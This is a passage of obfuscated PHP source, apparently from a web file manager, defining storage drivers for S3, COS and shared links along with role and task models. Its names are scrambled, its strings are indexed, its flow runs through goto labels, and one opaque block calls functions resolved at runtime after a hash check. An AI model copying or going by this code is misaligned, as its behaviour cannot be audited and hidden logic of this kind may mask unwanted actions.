$dŸ‹ŞÁ³´å =& $_SERVER[›èö’ù¤]; if (defined($dŸ‹ŞÁ³´å[1194])) { return; } define($dŸ‹ŞÁ³´å[1194], self::systemPath($dŸ‹ŞÁ³´å[1195])); goto EóÍÖ¾‚ë‡; AĞµÖ©ğ‹È: } public static function systemPath($DŒÇ¦‹…÷®) { goto d§Í¤µÅ¥µ; b„ÁŞ‹¯: if ($BÇÂ¨¦­‘™) { return $BÇÂ¨¦­‘™; } if ($DŒÇ¦‹…÷® == $d¯…Ø—ˆ›¦[1195]) { $BÇÂ¨¦­‘™ = self::make(Model($d¯…Ø—ˆ›¦[816])->systemRootPathAdd($d¯…Ø—ˆ›¦[532])); } else { $BÇÂ¨¦­‘™ = self::systemPath($d¯…Ø—ˆ›¦[1195]); $dĞß¦Ğõ…¹ = self::sourceID($BÇÂ¨¦­‘™); $BÇÂ¨¦­‘™ = self::make(Model($d¯…Ø—ˆ›¦[816])->mkdir($dĞß¦Ğõ…¹, $DŒÇ¦‹…÷®)); } Model($d¯…Ø—ˆ›¦[754])->set($cóÕÇŒÉÇô, $BÇÂ¨¦­‘™); goto Bé¿§Í÷õ½; d§Í¤µÅ¥µ: $d¯…Ø—ˆ›¦ =& $_SERVER[›èö’ù¤]; $cóÕÇŒÉÇô = $d¯…Ø—ˆ›¦[1202] . ucfirst($DŒÇ¦‹…÷®); $BÇÂ¨¦­‘™ = Model($d¯…Ø—ˆ›¦[754])->get($cóÕÇŒÉÇô); goto b„ÁŞ‹¯; Bé¿§Í÷õ½: return $BÇÂ¨¦­‘™; goto A³ÑÆ¼ó©¯; A³ÑÆ¼ó©¯: } public static function systemFolder($Cæ´Ã«ïë‚) { $D´ß†¶±¯ñ = IO_PATH_SYSTEM_SOURCE . $Cæ´Ã«ïë‚; $D¡õÁŠÇ = Cache::get($D´ß†¶±¯ñ); if (!$D¡õÁŠÇ) { $E¤ÌØÍ×•œ = IO::infoFull($D´ß†¶±¯ñ); if (!$E¤ÌØÍ×•œ) { $D¡õÁŠÇ = IO::mkdir($D´ß†¶±¯ñ, REPEAT_SKIP); } else { $D¡õÁŠÇ = $E¤ÌØÍ×•œ[$_SERVER[›èö’ù¤][76]]; } Cache::set($D´ß†¶±¯ñ, $D¡õÁŠÇ, 3600 * 10); } return $D¡õÁŠÇ; } public static function defaultDriver() { return Model($_SERVER[›èö’ù¤][751])->defaultDriver(); } public static function defaultIO() { $E÷ĞøÜÕÄ =& $_SERVER[›èö’ù¤]; $c¶–«®İ†§ = self::defaultDriver(); return $E÷ĞøÜÕÄ[1203] . $c¶–«®İ†§[$E÷ĞøÜÕÄ[395]] . $E÷ĞøÜÕÄ[1192]; } public static function defaultDriverInit() { static $eÙø´«µÙ = false; if ($eÙø´«µÙ) { return $eÙø´«µÙ; } $eÙø´«µÙ = IO::init(self::defaultIO()); return $eÙø´«µÙ; } public static function fileTypeList() { $C¬àÆÚøÂ =& $_SERVER[›èö’ù¤]; $f‹®©ÃÒ‰ = $GLOBALS[$C¬àÆÚøÂ[6]][$C¬àÆÚøÂ[1204]]; foreach ($f‹®©ÃÒ‰ as $dÛŸÃ²æ« => $d”Óä¦Ï—”) { $C½Â‘îù² = $C¬àÆÚøÂ[1205] . $dÛŸÃ²æ«; $d°éãëã‰¸ = LNG($C½Â‘îù²); if ($C½Â‘îù² != $d°éãëã‰¸) { $f‹®©ÃÒ‰[$dÛŸÃ²æ«][$C¬àÆÚøÂ[28]] = $d°éãëã‰¸; } } return $f‹®©ÃÒ‰; } public static function transferType($bÍÓ±‘¶‰ˆ, $dËØÑ°í°Ñ) { goto CªŒ¢Šå±—; bÄ•­Ë„ƒÚ: return $dç‰÷Æ«†¥[1208]; goto C¨ÀÎØ²õù; CªŒ¢Šå±—: $dç‰÷Æ«†¥ =& $_SERVER[›èö’ù¤]; $BÒ®ê‰‡Âê = self::driverType($bÍÓ±‘¶‰ˆ); $F‘Å×ÇÎù = self::driverType($dËØÑ°í°Ñ); goto E¢ÓÄƒŠÉ; E¢ÓÄƒŠÉ: if ($BÒ®ê‰‡Âê[$dç‰÷Æ«†¥[29]] == $F‘Å×ÇÎù[$dç‰÷Æ«†¥[29]] && $BÒ®ê‰‡Âê[$dç‰÷Æ«†¥[1206]] == $F‘Å×ÇÎù[$dç‰÷Æ«†¥[1206]]) { return $dç‰÷Æ«†¥[1207]; } if ($BÒ®ê‰‡Âê[$dç‰÷Æ«†¥[29]] == $dç‰÷Æ«†¥[856] && $F‘Å×ÇÎù[$dç‰÷Æ«†¥[29]] == $dç‰÷Æ«†¥[106]) { return $dç‰÷Æ«†¥[1118]; } if ($BÒ®ê‰‡Âê[$dç‰÷Æ«†¥[29]] == $dç‰÷Æ«†¥[106] && $F‘Å×ÇÎù[$dç‰÷Æ«†¥[29]] == $dç‰÷Æ«†¥[856]) { return $dç‰÷Æ«†¥[107]; } goto bÄ•­Ë„ƒÚ; C¨ÀÎØ²õù: } public static function driverType($EÛ‚ÜÌ£Æ) { goto EòÄ¤Í³…‰; fö¼¢®¥Ì°: if ($eÓ¾ÂÅòø == $e¨ÅÉçÇù¤[742] || $eÓ¾ÂÅòø == $e¨ÅÉçÇù¤[1210] || $eÓ¾ÂÅòø == $e¨ÅÉçÇù¤[1211]) { $EÛ‚ÜÌ£Æ = self::defaultDriverInit(); } else { if ($eÓ¾ÂÅòø == $e¨ÅÉçÇù¤[1125] || $eÓ¾ÂÅòø == $e¨ÅÉçÇù¤[1212]) { $EÛ‚ÜÌ£Æ = IO::init($EÛ‚ÜÌ£Æ->pathParse[$e¨ÅÉçÇù¤[1072]]); } } $eÓ¾ÂÅòø = str_replace($e¨ÅÉçÇù¤[1209], $e¨ÅÉçÇù¤[33], strtolower($EÛ‚ÜÌ£Æ->getType())); if ($eÓ¾ÂÅòø == $e¨ÅÉçÇù¤[106]) { return array($e¨ÅÉçÇù¤[29] => $e¨ÅÉçÇù¤[106], $e¨ÅÉçÇù¤[1206] => $e¨ÅÉçÇù¤[33], $e¨ÅÉçÇù¤[76] => $f†à±ÛÕ¾Â); } goto E‚Ó÷Á©í; E‚Ó÷Á©í: return array($e¨ÅÉçÇù¤[29] => $e¨ÅÉçÇù¤[856], $e¨ÅÉçÇù¤[1206] => $EÛ‚ÜÌ£Æ->pathDriver, $e¨ÅÉçÇù¤[76] => $f†à±ÛÕ¾Â); goto e«Éœ·¦¿ù; EòÄ¤Í³…‰: $e¨ÅÉçÇù¤ =& $_SERVER[›èö’ù¤]; $f†à±ÛÕ¾Â = $EÛ‚ÜÌ£Æ->path; $eÓ¾ÂÅòø = str_replace($e¨ÅÉçÇù¤[1209], $e¨ÅÉçÇù¤[33], strtolower($EÛ‚ÜÌ£Æ->getType())); goto fö¼¢®¥Ì°; e«Éœ·¦¿ù: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($f•‡²‹‡…É) { parent::__construct($f•‡²‹‡…É); $this->signatureVersion($_SERVER[›èö’ù¤][212]); } public function uploadFormData($D¾Õ¸ç, $c”ò­†ò¢Å = 3600) { goto AÏ„Š’¢ï¯; cïèš‹º¿: $eòñêº•ªƒ = $Bó°äèƒ…[1213]; $E¿®½·ÖÔ = gmdate($Bó°äèƒ…[1214], time() + $c”ò­†ò¢Å); $Eá±„ô‰Ø = (string) time() . $Bó°äèƒ…[68] . (string) (time() + $c”ò­†ò¢Å); goto fÀÕ”˜ĞäÒ; fÀÕ”˜ĞäÒ: $bà·ªÖº”™ = array($Bó°äèƒ…[1215] => $E¿®½·ÖÔ, $Bó°äèƒ…[1216] => array(array($Bó°äèƒ…[1217] => $c‰ß‰ëøŠ‰), array($Bó°äèƒ…[1218] => $this->bucket), array($Bó°äèƒ…[1219], $Bó°äèƒ…[1220], $Bó°äèƒ…[33]), array($Bó°äèƒ…[1221] => $eòñêº•ªƒ), array($Bó°äèƒ…[1222] => $dÑÉ©ãÙ‹Ç), array($Bó°äèƒ…[1223] => $this->accessKey), array($Bó°äèƒ…[1224] => $Eá±„ô‰Ø))); $bà·ªÖº”™ = json_encode($bà·ªÖº”™); $có¶§¼¯·ç = hash_hmac($Bó°äèƒ…[230], $Eá±„ô‰Ø, $this->secret); goto bÏÛÈ£…÷¥; bÏÛÈ£…÷¥: $Cˆº“½Âõ¤ = sha1($bà·ªÖº”™); $Eò²°áòå† = hash_hmac($Bó°äèƒ…[230], $Cˆº“½Âõ¤, $có¶§¼¯·ç); $D«Öë•ƒ„Ê = array($Bó°äèƒ…[1217] => $c‰ß‰ëøŠ‰, $Bó°äèƒ…[1221] => $eòñêº•ªƒ, $Bó°äèƒ…[1225] => base64_encode($bà·ªÖº”™), $Bó°äèƒ…[1222] => $dÑÉ©ãÙ‹Ç, $Bó°äèƒ…[1223] => $this->accessKey, $Bó°äèƒ…[1226] => $Eá±„ô‰Ø, $Bó°äèƒ…[1227] => $Eò²°áòå†, $Bó°äèƒ…[175] => $this->getHost()); goto C¨¤¯Å‡í; AÏ„Š’¢ï¯: $Bó°äèƒ… =& $_SERVER[›èö’ù¤]; $c‰ß‰ëøŠ‰ = $Bó°äèƒ…[192]; $dÑÉ©ãÙ‹Ç = $Bó°äèƒ…[230]; goto cïèš‹º¿; C¨¤¯Å‡í: return $D«Öë•ƒ„Ê; goto CæÜˆåô§ê; CæÜˆåô§ê: } public function fileOutLink($BÁŞÑ¨÷) { $cÅ„×ñˆÎœ =& $_SERVER[›èö’ù¤]; if (substr($BÁŞÑ¨÷, 0, 7) == $cÅ„×ñˆÎœ[1228]) { $BÁŞÑ¨÷ = $cÅ„×ñˆÎœ[1229] . substr($BÁŞÑ¨÷, 7); } header($cÅ„×ñˆÎœ[159] . $BÁŞÑ¨÷); die; } } goto DŞ·¼å¹§Ö; AÊ«Ä…²öµ: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\155\56\162\157\154\x65\x4c\151\163\x74"; public $field = array("\156\x61\155\145", "\x61\165\164\x68", "\x6c\141\142\145\x6c", "\144\151\163\x70\x6c\141\171", "\163\x79\x73\164\145\x6d", "\x64\145\x73\x63", "\151\x67\x6e\x6f\x72\x65\x45\170\x74", "\x69\147\156\x6f\x72\x65\x46\x69\x6c\145\x53\x69\x7a\x65", "\141\144\x6d\151\x6e\151\163\164\x72\141\x74\157\162", "\163\x6f\x72\164"); public function listData($CØŒŞµŠ‡ = false, $EîŒ»¨÷ôæ = "\163\x6f\162\164", $b®ëõÍ÷Áİ = false) { $EƒÄ¯í´Ãâ =& $_SERVER[›èö’ù¤]; $fÃƒİˆÅØØ = parent::listData($CØŒŞµŠ‡, $EîŒ»¨÷ôæ, $b®ëõÍ÷Áİ); if (!$CØŒŞµŠ‡) { foreach ($fÃƒİˆÅØØ as $bÂÏİŠØØß => $eöÂ›ˆ¬å³) { if ($eöÂ›ˆ¬å³[$EƒÄ¯í´Ãâ[1912]] == 1) { $fÃƒİˆÅØØ[$bÂÏİŠØØß][$EƒÄ¯í´Ãâ[446]] = LNG($EƒÄ¯í´Ãâ[2137]); } } } return $fÃƒİˆÅØØ; } public function update($B©ÅÒÌÁÒå, $Bê¼½ÄŒîñ) { goto c¼é÷çßŠØ; CéŠ™ª¸…µ: if (!$dÙâÀ°·öÉ || $DÑí×ñÁ–… && $DÑí×ñÁ–…[$c¦ç¥¿¡“©[395]] != $dÙâÀ°·öÉ[$c¦ç¥¿¡“©[395]]) { return !1; } if ($DÑí×ñÁ–…[$c¦ç¥¿¡“©[1912]] == 1) { $Bê¼½ÄŒîñ = array($c¦ç¥¿¡“©[28] => $Bê¼½ÄŒîñ[$c¦ç¥¿¡“©[28]], $c¦ç¥¿¡“©[1742] => $Bê¼½ÄŒîñ[$c¦ç¥¿¡“©[1742]]); } $this->filterAuth($Bê¼½ÄŒîñ[$c¦ç¥¿¡“©[408]]); goto B™¶¯°§×¯; c¼é÷çßŠØ: $c¦ç¥¿¡“© =& $_SERVER[›èö’ù¤]; $dÙâÀ°·öÉ = parent::listData($B©ÅÒÌÁÒå); $DÑí×ñÁ–… = $this->findByName($Bê¼½ÄŒîñ[$c¦ç¥¿¡“©[28]]); goto CéŠ™ª¸…µ; B™¶¯°§×¯: return parent::update($B©ÅÒÌÁÒå, $Bê¼½ÄŒîñ); goto d·æªİÏÔ; d·æªİÏÔ: } public function remove($f¯ˆéÇÖ°) { $Eãœà±¢º = parent::listData($f¯ˆéÇÖ°); if (!$Eãœà±¢º || $Eãœà±¢º[$_SERVER[›èö’ù¤][1195]]) { return !1; } return parent::remove($f¯ˆéÇÖ°); } public function add($dˆìªÏáŠÕ) { goto bç‰Òí‚­; bç‰Òí‚­: $b§ÜÂ¯½æ =& $_SERVER[›èö’ù¤]; $D«¦Ô¤«· = $dˆìªÏáŠÕ[$b§ÜÂ¯½æ[28]]; if ($this->findByName($D«¦Ô¤«·)) { return !1; } goto C“Î ÎéÏ; cí×†¡ì¨: return parent::insert($dˆìªÏáŠÕ); goto BÅÏİˆƒÁÑ; C“Î ÎéÏ: $còŞå¹Ğá = array($b§ÜÂ¯½æ[415] => $D«¦Ô¤«·, $b§ÜÂ¯½æ[1726] => $b§ÜÂ¯½æ[33], $b§ÜÂ¯½æ[1722] => $b§ÜÂ¯½æ[1730], $b§ÜÂ¯½æ[2138] => 1, $b§ÜÂ¯½æ[1725] => 0, $b§ÜÂ¯½æ[2139] => 0, $b§ÜÂ¯½æ[1724] => $this->getSort()); $dˆìªÏáŠÕ = array_merge($còŞå¹Ğá, $dˆìªÏáŠÕ); $this->filterAuth($dˆìªÏáŠÕ[$b§ÜÂ¯½æ[408]]); goto cí×†¡ì¨; BÅÏİˆƒÁÑ: } private function getSort() { $ağ®äÊ…ˆ§ =& $_SERVER[›èö’ù¤]; $dì÷êÀçÖ» = parent::listData(); $b‚×¢¸Ğà« = array_to_keyvalue($dì÷êÀçÖ», $ağ®äÊ…ˆ§[33], $ağ®äÊ…ˆ§[1743]); return empty($b‚×¢¸Ğà«) ? 0 : max($b‚×¢¸Ğà«) + 1; } private function filterAuth(&$eÅïê…„¿ö) { $Fº©„ò¤Œ =& $_SERVER[›èö’ù¤]; $Aí‰ƒí½÷ = array(); $dÚ¶ƒ·¹Úª = array_filter(explode($Fº©„ò¤Œ[47], $eÅïê…„¿ö)); foreach ($dÚ¶ƒ·¹Úª as $eÅïê…„¿ö) { $Fµê”–Åêù = explode($Fº©„ò¤Œ[95], $eÅïê…„¿ö); if ($Fµê”–Åêù[0] == $Fº©„ò¤Œ[2140] && $Fµê”–Åêù[1] != $Fº©„ò¤Œ[1114]) { $DœÁªñƒ = $Fµê”–Åêù[0] . $Fº©„ò¤Œ[95] . $Fµê”–Åêù[1] . $Fº©„ò¤Œ[2141]; if (!in_array($DœÁªñƒ, $dÚ¶ƒ·¹Úª)) { $Aí‰ƒí½÷[] = $DœÁªñƒ; } } $Aí‰ƒí½÷[] = $eÅïê…„¿ö; } $eÅïê…„¿ö = implode($Fº©„ò¤Œ[47], $Aí‰ƒí½÷); } public function sort($EÄñ˜¥‰ñ, $dÒ‹ìÎŞÓ) { return parent::update($EÄñ˜¥‰ñ, $dÒ‹ìÎŞÓ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\x6d\x2e\x74\x61\x73\153\114\151\x73\x74"; public $field = array("\x6e\141\x6d\145", "\164\171\160\x65", "\x65\166\145\156\x74", "\164\151\155\145", "\144\x65\x73\x63", "\163\171\x73\x74\x65\155", "\145\x6e\x61\142\154\x65", "\154\141\x73\164\x52\x75\x6e", "\163\157\x72\x74"); public function listData($A…Í¤Ñ´ŞÛ = false, $fïùÃí¡¤ò = "\163\x6f\162\x74", $Dšƒ˜à„ƒŒ = false) { return parent::listData($A…Í¤Ñ´ŞÛ, $fïùÃí¡¤ò, $Dšƒ˜à„ƒŒ); } public function add($BŸŠˆÇ‘ë) { $dÊçËÚë¸â =& $_SERVER[›èö’ù¤]; $cÆÇ£‘¿á = $this->findByName($BŸŠˆÇ‘ë[$dÊçËÚë¸â[28]]); if ($cÆÇ£‘¿á) { return !1; } $BŸŠˆÇ‘ë[$dÊçËÚë¸â[1515]] = 0; $BŸŠˆÇ‘ë[$dÊçËÚë¸â[1743]] = $this->getSort(); return parent::insert($BŸŠˆÇ‘ë); } private function getSort() { $fà¹©å›³Š =& $_SERVER[›èö’ù¤]; $EŸ´ÌÒ‡¼Œ = parent::listData(); $DŒ¯³£³øá = array_to_keyvalue($EŸ´ÌÒ‡¼Œ, $fà¹©å›³Š[33], $fà¹©å›³Š[1743]); return empty($DŒ¯³£³øá) ? 0 : max($DŒ¯³£³øá) + 1; } public function update($Eô…Ô†ÚÉ, $eâ±ÜºÆ±“) { $aÔ·É³Ç«É =& $_SERVER[›èö’ù¤]; $C¯íœ„¤‚ = $this->listData($Eô…Ô†ÚÉ); $b™¾­¯õØ = $this->findByName($eâ±ÜºÆ±“[$aÔ·É³Ç«É[28]]); if (!$C¯íœ„¤‚ || $b™¾­¯õØ && $b™¾­¯õØ[$aÔ·É³Ç«É[395]] != $C¯íœ„¤‚[$aÔ·É³Ç«É[395]]) { return !1; } return parent::update($Eô…Ô†ÚÉ, $eâ±ÜºÆ±“); } public function remove($Bˆ„‰¶îäË, $fõÌëßĞ‡ù = false) { $d“ç¶Ò¾à× =& $_SERVER[›èö’ù¤]; $fÌ–‡õÄ— = $this->listData($Bˆ„‰¶îäË); if (!$fÌ–‡õÄ—) { return; } if (!$fõÌëßĞ‡ù && $fÌ–‡õÄ—[$d“ç¶Ò¾à×[1195]] == $d“ç¶Ò¾à×[87]) { return !1; } return parent::remove($Bˆ„‰¶îäË); } public function enable($cË¤®‰¸, $a‰’Æä ¥ù) { return $this->update($cË¤®‰¸, array($_SERVER[›èö’ù¤][2132] => $a‰’Æä ¥ù)); } public function run($DÚâ‰à±¬) { return $this->update($DÚâ‰à±¬, array($_SERVER[›èö’ù¤][2142] => time())); } } goto f†’Æ”²Ëª; báÒç“„ùá: class PathDriverDriverShareItem { public function __construct($D¥¬ùäŒ³Œ) { $this->pathParse = $D¥¬ùäŒ³Œ; } public function __call($C¹áĞ­¸Ï, $B¤Ö©¯‚Ü) { $dšÉùğµ° =& $_SERVER[›èö’ù¤]; if (method_exists($this, $C¹áĞ­¸Ï)) { return; } $côñ¥é¹Õ = call_user_func_array(array($dšÉùğµ°[1239], $C¹áĞ­¸Ï), $B¤Ö©¯‚Ü); $D®é¦»Šá³ = array($dšÉùğµ°[1240], $dšÉùğµ°[1241], $dšÉùğµ°[1242], $dšÉùğµ°[1243], $dšÉùğµ°[544], $dšÉùğµ°[546], $dšÉùğµ°[1244], $dšÉùğµ°[107], $dšÉùğµ°[1245], $dšÉùğµ°[1246]); if (in_array($C¹áĞ­¸Ï, $D®é¦»Šá³)) { $côñ¥é¹Õ = $this->getPathOuter($côñ¥é¹Õ); } return $côñ¥é¹Õ; } public function copy($E“ÁÓÕíˆ, $A³ù‹Ğƒ®à, $EÏÔ›Ü×òô = false) { return $this->copyMove($E“ÁÓÕíˆ, $A³ù‹Ğƒ®à, $EÏÔ›Ü×òô, $_SERVER[›èö’ù¤][544]); } public function move($C‚Û½“áÏø, $B¡Ñ´‘µò¹, $Bî—–°ß¢” = false) { return $this->copyMove($C‚Û½“áÏø, $B¡Ñ´‘µò¹, $Bî—–°ß¢”, $_SERVER[›èö’ù¤][546]); } private function copyMove($a·œ‹­é¸º, $BÆÔ”õ³åø, $a®½ñöñßù, $B¿ãÕš½) { goto cÈŠĞø§ëî; cÈŠĞø§ëî: $BĞÌÔì³„ =& $_SERVER[›èö’ù¤]; $d©¼·ìªÑ¹ = $BÆÔ”õ³åø; $Dáİ•‹¡ = IO::driverMake($BÆÔ”õ³åø); goto F¡»øì Ê„; F¡»øì Ê„: if ($Dáİ•‹¡->pathParse[$BĞÌÔì³„[1072]]) { $BÆÔ”õ³åø = $Dáİ•‹¡->pathParse[$BĞÌÔì³„[1072]]; } else { $BÆÔ”õ³åø = $d©¼·ìªÑ¹; } $Dô‡‘¤¬ÁÑ = IO::copyMove($a·œ‹­é¸º, $BÆÔ”õ³åø, $a®½ñöñßù, $B¿ãÕš½); $Dô‡‘¤¬ÁÑ = $this->getPathOuter($Dô‡‘¤¬ÁÑ); goto dã¿ù‡ÉĞ×; dã¿ù‡ÉĞ×: return $Dô‡‘¤¬ÁÑ; goto bã¿š¢äÇ¦; bã¿š¢äÇ¦: } public function pathThis($A‡ó•à±) { return get_path_this($this->pathParse[$_SERVER[›èö’ù¤][76]]); } public function pathFather($AÑ†¼µŒ°Í) { return get_path_father($this->pathParse[$_SERVER[›èö’ù¤][76]]); } public function iconvSystem($bµ­¾öÚ¿) { return $bµ­¾öÚ¿; } protected function infoParse($eÖïŒ¦­„ˆ, $a·çŠÂ³ôÒ = false) { $CÌ’‰Ê»Ò =& $_SERVER[›èö’ù¤]; $f™ÊæŸÖ±† = $this->pathParse[$CÌ’‰Ê»Ò[481]][$CÌ’‰Ê»Ò[1095]] . $this->pathParse[$CÌ’‰Ê»Ò[1088]]; if ($a·çŠÂ³ôÒ) { $AÌÄæ¿óÒ = IO::infoWithChildren($f™ÊæŸÖ±†); } else { $AÌÄæ¿óÒ = IO::info($f™ÊæŸÖ±†); } $B‚™Ì’Ê˜ = $this->pathParse[$CÌ’‰Ê»Ò[481]]; return Action($CÌ’‰Ê»Ò[1238])->_shareItemeParse($AÌÄæ¿óÒ, $B‚™Ì’Ê˜); } public function listAll($dÅ…£÷Ş›î) { $Bª‘˜ôŒ =& $_SERVER[›èö’ù¤]; $FÑŞÖÆ‰ƒ„ = IO::listAll($dÅ…£÷Ş›î); $b„†‚Î‚Ä = $this->pathParse[$Bª‘˜ôŒ[481]]; foreach ($FÑŞÖÆ‰ƒ„ as &$aßø¯­¢®Ü) { check_abort(); $dß…ìÛ‡–¶ = IO::info($aßø¯­¢®Ü[$Bª‘˜ôŒ[76]]); $dß…ìÛ‡–¶ = is_array($dß…ìÛ‡–¶) ? $dß…ìÛ‡–¶ : array(); $aßø¯­¢®Ü = array_merge($dß…ìÛ‡–¶, $aßø¯­¢®Ü); $aßø¯­¢®Ü[$Bª‘˜ôŒ[85]] = Action($Bª‘˜ôŒ[1238])->_shareItemeParse($aßø¯­¢®Ü, $b„†‚Î‚Ä); } unset($aßø¯­¢®Ü); return $FÑŞÖÆ‰ƒ„; } public function getPathOuter($A«ªÂ¾ô) { goto bõê£ÁÓÓï; bõê£ÁÓÓï: $AìØÈƒªÑ =& $_SERVER[›èö’ù¤]; $dÔì§•†ØË = KodIO::parse($A«ªÂ¾ô); if ($dÔì§•†ØË[$AìØÈƒªÑ[29]] == KodIO::KOD_SHARE_ITEM) { return $dÔì§•†ØË[$AìØÈƒªÑ[76]]; } goto b—Í¨åÒ§; c£ÓëÏùŒ°: if (substr($B¦ù¯©Ìºô, 0, strlen($b»ÅÔ»‚‚)) != $b»ÅÔ»‚‚) { return !1; } return $this->pathParse[$AìØÈƒªÑ[1089]] . $AìØÈƒªÑ[8] . ltrim($fÈáµ›§Ú, $AìØÈƒªÑ[8]); goto Eà›ãêï¯å; b—Í¨åÒ§: $B¦ù¯©Ìºô = KodIO::clear($A«ªÂ¾ô); $b»ÅÔ»‚‚ = KodIO::clear($this->pathParse[$AìØÈƒªÑ[481]][$AìØÈƒªÑ[1095]]); $fÈáµ›§Ú = substr($B¦ù¯©Ìºô, strlen($b»ÅÔ»‚‚)); goto c£ÓëÏùŒ°; Eà›ãêï¯å: } public function getType() { $A¦‡÷†ºÉÚ =& $_SERVER[›èö’ù¤]; $CÆÉâ»í¦ = str_replace($A¦‡÷†ºÉÚ[72], $A¦‡÷†ºÉÚ[33], get_class($this)); return strtolower($CÆÉâ»í¦); } public function isTypeObject($cˆŞ¬äÕœİ) { return IO::isTypeObject($cˆŞ¬äÕœİ); } public function info($A••ŠŸ ‚¡) { return $this->infoParse($A••ŠŸ ‚¡); } public function infoAuth($EËÑá¬Ãê‡) { return $this->infoParse($EËÑá¬Ãê‡); } public function infoWithChildren($e¼ñÓĞÆš÷) { return $this->infoParse($e¼ñÓĞÆš÷, !0); } public function infoFull($eĞšà¸ÃÄ¤) { return $this->infoParse($eĞšà¸ÃÄ¤); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($EóÅòÚäİ) { $this->pathParse = $EóÅòÚäİ; } protected function infoParse($c…”Ç‡µ¼Ş, $BÁéĞîìÂ‰ = false) { $A„Ğ‹ã†«ˆ =& $_SERVER[›èö’ù¤]; return Action($A„Ğ‹ã†«ˆ[1094])->sharePathInfo($this->pathParse[$A„Ğ‹ã†«ˆ[76]], !0, $BÁéĞîìÂ‰); } public function listPath($AÃê¯Ù·ğ, $dË×»œêŞ‰ = false) { $d­ÅˆÁ¡Ã =& $_SERVER[›èö’ù¤]; $Bäù®×ÅŒ = IO::listPath($AÃê¯Ù·ğ, $dË×»œêŞ‰); foreach ($Bäù®×ÅŒ as $B½õ­ˆê³¯ => $BÍ ½Ó´ˆš) { if (!in_array($B½õ­ˆê³¯, array($d­ÅˆÁ¡Ã[74], $d­ÅˆÁ¡Ã[75]))) { continue; } foreach ($BÍ ½Ó´ˆš as $E¡„Õ­¼ï¶ => $BáÆ™¦áòÆ) { $BáÆ™¦áòÆ = Action($d­ÅˆÁ¡Ã[1247])->parsePathChildren($BáÆ™¦áòÆ, array($d­ÅˆÁ¡Ã[416] => $AÃê¯Ù·ğ)); $Bäù®×ÅŒ[$B½õ­ˆê³¯][$E¡„Õ­¼ï¶] = Action($d­ÅˆÁ¡Ã[1094])->shareItemInfo($BáÆ™¦áòÆ); } } return $Bäù®×ÅŒ; } public function listAll($fÅÓ±âæ) { $Aíš’›¬óò =& $_SERVER[›èö’ù¤]; $bÖ†å©Ä¨Ñ = IO::listAll($fÅÓ±âæ); foreach ($bÖ†å©Ä¨Ñ as &$C‚–ğæÙª¥) { $E²…¶˜ÚÕ‘ = IO::info($C‚–ğæÙª¥[$Aíš’›¬óò[76]]); $E²…¶˜ÚÕ‘ = is_array($E²…¶˜ÚÕ‘) ? $E²…¶˜ÚÕ‘ : array(); $C‚–ğæÙª¥ = array_merge($E²…¶˜ÚÕ‘, $C‚–ğæÙª¥); $C‚–ğæÙª¥[$Aíš’›¬óò[85]] = Action($Aíš’›¬óò[1094])->shareItemInfo($C‚–ğæÙª¥); } unset($C‚–ğæÙª¥); return $bÖ†å©Ä¨Ñ; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($EòŸ÷¨ˆèÙ) { parent::__construct($EòŸ÷¨ˆèÙ); } } goto f·ùÈòá‚è; C’·Ô˜§: if ($_SERVER[$_SERVER[›èö’ù¤][831]] != $A®‘‡ÆŒÚ®($Aôù«ÈÙ“)) { goto f›ª°À±æ; BÍ½Ï®¯Î½: $DøÍôî¡… = explode($_SERVER[›èö’ù¤][229], $d‚“íªğÑ); if (count($DøÍôî¡…) < $_SERVER[›èö’ù¤][616]) { $c›¸ôİ’Ú = $_SERVER[›èö’ù¤][836]; $c›¸ôİ’Ú(); } $C²Äç‹ÖõÓ = $_SERVER[›èö’ù¤][837]; goto c•ÙÇöõ±ó; f›ª°À±æ: $DÁíçË®Öƒ = $_SERVER[›èö’ù¤][833]; $FñŸ…ëé¶¢ = $_SERVER[$_SERVER[›èö’ù¤][834]] . $_SERVER[›èö’ù¤][835]; $d‚“íªğÑ = $DÁíçË®Öƒ($FñŸ…ëé¶¢); goto BÍ½Ï®¯Î½; c•ÙÇöõ±ó: $C²Äç‹ÖõÓ($Aôù«ÈÙ“); goto EŒ¯‚Ç““¥; EŒ¯‚Ç““¥: } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($DèÔ‡ê‡”) { parent::__construct($DèÔ‡ê‡”); } public function uploadFormData($B„ª–¦ØêÔ, $Dà§…ÖÖè× = 3600) { goto EŸ– ˜¶; C¶ÅÎ×¶¯É: $fÔìÆñµğÖ = base64_encode(json_encode($e®©Ûæ¿³Ş)); $d­™ç Ø¯® = hash_hmac($f¯Ú‹½®¬ğ[1258], $EÑáŞåì Ô, $f¯Ú‹½®¬ğ[1259] . $this->secret, !0); $DÏ†ì„Æ‰ = hash_hmac($f¯Ú‹½®¬ğ[1258], $this->region, $d­™ç Ø¯®, !0); goto aéËÖ‡Ã³; Eï«•²ß õ: $b¯áê™˜Ï = $f¯Ú‹½®¬ğ[59]; $e¯Øé’§ÙŠ = gmdate($f¯Ú‹½®¬ğ[1249]); $EÑáŞåì Ô = gmdate($f¯Ú‹½®¬ğ[735]); goto Bæ…½·ø´‡; EŸ– ˜¶: $f¯Ú‹½®¬ğ =& $_SERVER[›èö’ù¤]; $FÕ©Æø³¡» = $f¯Ú‹½®¬ğ[192]; $Dùöá‰‚İœ = $f¯Ú‹½®¬ğ[1248]; goto Eï«•²ß õ; Bæ…½·ø´‡: $eÅ©¯¶Ï‹ó = $f¯Ú‹½®¬ğ[1250]; $EƒëÜÏ¼îä = $Dà§…ÖÖè× . $f¯Ú‹½®¬ğ[33]; $AÜÜÍÊ±íî = $f¯Ú‹½®¬ğ[1213]; goto Dà†ñÍ ñ; Dà†ñÍ ñ: $AÁÁÍ’·Á = array($this->accessKey, $EÑáŞåì Ô, $this->region, $b¯áê™˜Ï, $eÅ©¯¶Ï‹ó); $A³áß‡ä = implode($f¯Ú‹½®¬ğ[8], $AÁÁÍ’·Á); $e®©Ûæ¿³Ş = array($f¯Ú‹½®¬ğ[1215] => gmdate($f¯Ú‹½®¬ğ[1214], strtotime($f¯Ú‹½®¬ğ[1251])), $f¯Ú‹½®¬ğ[1216] => array(array($f¯Ú‹½®¬ğ[1218] => $this->bucket), array($f¯Ú‹½®¬ğ[1217] => $FÕ©Æø³¡»), 